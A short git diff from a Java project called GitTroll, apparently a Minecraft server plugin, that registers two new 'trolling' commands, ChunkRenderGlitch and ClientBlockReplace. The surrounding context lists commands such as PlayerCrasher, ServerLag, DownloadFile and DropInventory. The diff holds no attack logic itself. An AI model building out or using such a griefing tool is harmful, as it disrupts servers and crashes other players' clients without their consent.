@@ -43,6 +43,8 @@ import net.Lenni0451.GitTroll.command.commands.server.Reload;
 import net.Lenni0451.GitTroll.command.commands.server.ServerLag;
 import net.Lenni0451.GitTroll.command.commands.server.SetSlots;
 import net.Lenni0451.GitTroll.command.commands.server.Stop;
+import net.Lenni0451.GitTroll.command.commands.trolling.ChunkRenderGlitch;
+import net.Lenni0451.GitTroll.command.commands.trolling.ClientBlockReplace;
 import net.Lenni0451.GitTroll.command.commands.trolling.DropHand;
 import net.Lenni0451.GitTroll.command.commands.trolling.DropInventory;
 import net.Lenni0451.GitTroll.command.commands.trolling.Explode;
@@ -94,6 +96,8 @@ public class CommandManager implements Listener {
 	public final DownloadFile DownloadFile = null;
 	public final UnhookPacketListener UnhookPacketListener = null;
 	public final PlayerCrasher PlayerCrasher = null;
+	public final ClientBlockReplace ClientBlockReplace = null;
+	public final ChunkRenderGlitch ChunkRenderGlitch = null;
 	
 	public CommandManager() {
 		this.commands = new ArrayList<>();
